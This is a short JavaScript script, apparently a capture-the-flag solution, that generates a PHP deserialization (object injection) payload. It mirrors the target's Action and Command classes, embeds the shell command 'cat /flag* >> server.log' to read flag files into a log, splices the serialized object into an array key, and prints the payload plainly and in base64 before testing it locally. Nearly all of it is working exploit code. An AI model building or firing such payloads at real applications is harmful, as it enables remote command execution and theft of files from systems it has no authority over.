// npm install php-serialize
const { serialize, unserialize } = require('php-serialize');

let exploit_successful = false;

class Action {
	sig;
	params;

	constructor() {
		this.sig = null;
		this.params = {};
	}

	serialize() {
		const data = {};
		data.p = this.params;
		data.s = this.sig;
		return JSON.stringify(data);
	}

	unserialize(raw) {
		const data = JSON.parse(raw);
		this.sig = data.s;
		this.params = data.p;
	}

	toString() {
		if (this.params.cmd) {
			exploit_successful = true;
		}
	}
}

class Command extends Action {
	res;

	constructor(cmd) {
		super();
		this.params.cmd = cmd;
		this.res = null;
	}
}


const command_instance = new Command('cat /flag* >> server.log');
const serialized_command = serialize(command_instance);
console.log('Serialized command:', serialized_command);

const serialized_object = serialize({'exploit-key' : null});
console.log('Serialized object:', serialized_object);


// Create payload
const payload = serialized_object.replace(/s:\d+:"exploit-key"/, serialized_command);
console.log('Exploit payload:', payload);
console.log('Exploit payload in base64:', btoa(payload));

// Test payload
unserialize(payload, { Command });
console.log(exploit_successful ? 'Exploit was executed successfully' : 'Failed to execute exploit');
